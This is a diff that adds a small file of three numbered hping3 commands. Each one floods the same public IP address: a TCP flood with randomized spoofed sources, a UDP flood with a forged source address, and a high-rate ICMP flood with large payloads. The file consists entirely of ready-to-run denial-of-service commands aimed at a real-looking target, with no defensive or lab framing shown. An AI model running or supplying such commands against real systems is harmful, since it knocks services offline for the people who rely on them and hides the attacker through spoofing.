@@ -1,0 +1,10 @@
+#1
+hping3 -V -c 10000 --rand-source --faster 138.197.149.203
+
+#2
+hping3 -V --udp -c 9000 --spoof 192.168.10.10 --faster 138.197.149.203
+
+#3
+hping3 -V --icmp -c 11000 -i u14600 -d 1000 138.197.149.203
+
+
